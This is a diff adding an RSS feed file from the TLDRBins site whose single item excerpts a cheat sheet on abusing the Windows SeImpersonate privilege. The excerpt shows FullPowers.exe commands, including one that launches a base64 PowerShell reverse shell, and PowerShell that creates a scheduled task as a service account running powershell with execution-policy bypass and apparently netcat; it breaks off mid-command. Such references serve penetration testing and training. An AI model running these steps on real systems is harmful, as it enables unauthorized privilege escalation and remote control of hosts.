@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SeImpresonate on TLDRBins</title>
+    <link>https://tldrbins.github.io/@seimpresonate/</link>
+    <description>Recent content in SeImpresonate on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@seimpresonate/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SeImpresonate</title>
+      <link>https://tldrbins.github.io/seimpresonate/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/seimpresonate/</guid>
+      <description>Abuse #1: Recover SeImpresonate FullPower&#xA;.\FullPowers.exe -c &amp;#34;whoami /priv&amp;#34; # Revshell .\FullPowers.exe -c &amp;#34;&amp;lt;powershell #3 Base64&amp;gt;&amp;#34; Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = &amp;#34;SeAssignPrimaryTokenPrivilege&amp;#34;, &amp;#34;SeAuditPrivilege&amp;#34;, &amp;#34;SeChangeNotifyPrivilege&amp;#34;, &amp;#34;SeCreateGlobalPrivilege&amp;#34;, &amp;#34;SeImpersonatePrivilege&amp;#34;, &amp;#34;SeIncreaseQuotaPrivilege&amp;#34;, &amp;#34;SeIncreaseWorkingSetPrivilege&amp;#34;, &amp;#34;SeTimeZonePrivilege&amp;#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId &amp;#34;&amp;lt;SERVICE_ACCOUNT&amp;gt;&amp;#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute &amp;#34;powershell.exe&amp;#34; -Argument &amp;#34;-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.</description>
+    </item>
+  </channel>
+</rss>
